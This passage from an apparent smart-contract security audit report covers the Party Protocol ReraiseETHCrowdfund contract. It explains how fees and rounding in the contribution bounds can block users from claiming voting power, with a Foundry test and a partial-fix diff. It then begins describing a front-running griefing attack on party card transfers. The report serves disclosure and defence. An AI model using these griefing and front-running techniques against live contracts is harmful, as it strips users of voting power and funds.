class=\"mtk11\">RemainingVotingPowerAfterClaimError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Now we are in a position to look at a simple scenario how a user can end up without being able to claim his pending voting power (Note that this can also be a griefing attack whereby an attacker contributes for the victim some possibly small amount thereby making it impossible for the victim to claim):</p>\n<p>(The test should be added to the <code>ReraiseETHCrowdfund.t.sol</code> test file)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_cannotClaim1</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ReraiseETHCrowdfund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCrowdfund</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContribution:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContributor:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialDelegate:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.9</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">disableContributingForExistingCard:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">duration:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitBps:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitRecipient:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Contribute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pendingVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">ETHCrowdfundBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AboveMaximumContributionsError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">1500000000000000000</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">1000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>In this test the following values were chosen for the important variables that I mentioned above:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">minContribution = 0.9e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">maxContribution = 1e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">minTotalContributions = 1e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">maxTotalContributions = 1.5e18</span></span></code></pre>\n<p>What happens in the test is that first <code>1 ETH</code> is contributed then another <code>0.5 ETH</code> is contributed (It says <code>1 ETH</code> but <code>maxTotalContributions</code> is hit and so only <code>0.5 ETH</code> is contributed and the crowdfund is finalized).</p>\n<p>The call to the <code>claim</code> function fails because <code>contribution = 1.5 ETH</code> which is above <code>maxContribution</code>.</p>\n<p>The important thing is now to understand that <code>claimMultiple</code> can also not be called (therefore the pending voting power cannot be claimed at all).</p>\n<p>When we call <code>claimMultiple</code> the contribution for the first party card must be in the range <code>[0.9e18, 1e18]</code> to succeed and therefore the second contribution can only be in the range of <code>[0.5e18,0.6e18]</code> which is below <code>minContribution</code> and therefore it is not possible to distribute the voting power across cards such that the call succeeds.</p>\n<p>What we discussed so far could be mitigated by introducing some simple checks when setting up the crowdfund. The sort of checks required are like ”<code>minTotalContributions</code> must be divisible by <code>minContribution</code>”. I won’t go into this deeply however because these checks are insufficient when we introduce a funding fee.</p>\n<p>Let’s consider a case with:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">minContribution = 1e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">maxContribution = 1e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">minTotalContributions = 2e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">maxTotalContributions = 2e18</span></span></code></pre>\n<p>(Note that setting up the crowdfund with <code>minContribution==maxContribution</code> is an important use case where the party wants to enforce a “1 card = 1 vote”-policy).</p>\n<p>There should be no way how this scenario causes a problem right? The contribution of a user can only be <code>1e18</code> or <code>2e18</code> and in both cases the checks in the claim functions should pass. - No</p>\n<p>It breaks when we introduce a fee. Say there is a 1% fee (<code>fundingSplitBps=100</code>).</p>\n<p>The contribution is calculated as (as we know from above):</p>\n<p>(Also note that <code>exchangeRateBps=1e4</code> for all tests, i.e. the exchange rate between ETH and votes is 1:1)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The problem is that <code>votingPower</code> has been reduced by 1% due to the funding fee. So when a user initially contributes <code>1e18</code>, the <code>contribution</code> here is calculated to be <code>0.99e18 * 1e4 / 1e4 = 0.99e18</code> which is below <code>minContribution</code> and claiming is not possible.</p>\n<p>Let’s make a final observation: The parameters can also be such that due to rounding a similar thing happens:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">minContribution = 1e18 + 1 Wei</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">maxContribution = 1e18 + 1 Wei</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">minTotalContributions = 2e18 + 2 Wei</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">maxTotalContributions = 2e18 + 2 Wei</span></span></code></pre>\n<p>Due to rounding (when calculating the funding fee or when there is not a 1:1 exchange rate) the 1 Wei in the contribution can be lost (or some other small amount) and thereby when calling <code>claim</code>, the <code>contribution</code> which has been rounded down is below <code>minContribution</code> and the claim fails.</p>\n<p>To summarize we have seen 3 scenarios. It is not possible for me to provide an overview of all the things that can go wrong. There are just too many variables. I come back to this point in my recommendation.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A part of the fix is straightforward. However this is not a full fix.</p>\n<p>I recommend to implement a functionality for claiming that cannot be blocked. I know that this may cause the “1 card = 1 vote”-policy to be violated and it may also cause <code>minContribution</code> or <code>maxContribution</code> to be violated. But maybe this is the price to pay to ensure that users can always claim.</p>\n<p>An alternative solution may be to reduce the range of possible configurations of the crowdfund drastically such that it can be mathematically proven that users are always able to claim.</p>\n<p>That being said there is an obvious flaw in the current code that has been confirmed by the sponsor.</p>\n<p>The <code>contribution</code> amount that is calculated when claiming needs to add back the funding fee amount. I.e. if there was a 1% funding fee, the <code>contribution</code> amount should be <code>1e18</code> instead of <code>0.99e18</code>.</p>\n<p>Partial fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 580623d..0b1ba9e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -268,6 +268,13 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint96 contribution = (votingPower * 1e4) / exchangeRateBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            address payable fundingSplitRecipient_ = fundingSplitRecipient;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint16 fundingSplitBps_ = fundingSplitBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (fundingSplitRecipient_ != address(0) &amp;&amp; fundingSplitBps_ &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                contribution = (contribution * 1e4) / (1e4 - fundingSplitBps_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint96 maxContribution_ = maxContribution;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Check that the contribution equivalent of total pending voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // power is not above the max contribution range. This can happen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -360,6 +367,13 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // card (e.g. a party desiring a &quot;1 card = 1 vote&quot;-like governance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // system where each card has equal voting power).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            address payable fundingSplitRecipient_ = fundingSplitRecipient;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint16 fundingSplitBps_ = fundingSplitBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (fundingSplitRecipient_ != address(0) &amp;&amp; fundingSplitBps_ &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                contribution = (contribution * 1e4) / (1e4 - fundingSplitBps_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (contribution &lt; minContribution_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 revert BelowMinimumContributionsError(contribution, minContribution_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/13#issuecomment-1526174262\">0xble (Party) commented</a>:</strong></p>\n<blockquote>\n<p>Additional to the partial fix recommended in the mitigation, this will be mitigated by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/37#issuecomment-1526104629\">preventing the case where <code>minContribution</code> may be bypassed for the last contributor when the remaining contribution is less than the minimum</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-reraiseethcrowdfundsol-party-card-transfer-can-be-front-run-by-claiming-pending-voting-power-which-results-in-a-loss-of-the-voting-power\" style=\"position:relative;\"><a href=\"#h-05-reraiseethcrowdfundsol-party-card-transfer-can-be-front-run-by-claiming-pending-voting-power-which-results-in-a-loss-of-the-voting-power\" aria-label=\"h 05 reraiseethcrowdfundsol party card transfer can be front run by claiming pending voting power which results in a loss of the voting power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/12\">[H-05] <code>ReraiseETHCrowdfund.sol</code>: party card transfer can be front-run by claiming pending voting power which results in a loss of the voting power</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/12\">HollaDieWaldfee</a></em></p>\n<p>In this report I show how an attacker can abuse the fact that anyone can call <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303\"><code>ReraiseETHCrowdfund.claim</code></a> for any user and add voting power to an existing party card.</p>\n<p>The result can be a griefing attack whereby the victim loses voting power. In some cases the attacker can take advantage himself.</p>\n<p>In short this is what needs to happen:</p>\n<ol>\n<li>The victim sends a transaction to transfer one of his party cards</li>\n<li>The transaction is front-run and pending voting power of the victim from the <code>ReraiseETHCrowdfund</code> contract is claimed to this party card that is transferred</li>\n<li>The victim thereby loses the pending voting power</li>\n</ol>\n<p>The fact that any user is at risk that has pending voting power and transfers a party card and that voting power is arguably the most important asset in the protocol makes me estimate this to be “High” severity.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>We start by observing that when the <code>ReraiseETHCrowdfund</code> is won, any user can call <code>ReraiseETHCrowdfund.claim</code> for any other user and either mint a new party card to him or add the pending voting power to an existing party card:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Claim a party card for a contributor if the crowdfund won. Can be called</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///         to claim for self or on another&#39;s behalf.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param tokenId The ID of the party card to add voting power to. If 0, a</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///                new card will be minted.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param contributor The contributor to claim for.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check crowdfund lifecycle.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">CrowdfundLifecycle</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lc</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getCrowdfundLifecycle</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lc</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">CrowdfundLifecycle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Finalized</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WrongLifecycleError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pendingVotingPower</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contribution</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">exchangeRateBps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxContribution_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxContribution</span><span class=\"mtk1\">;</span></span></span>\n<span 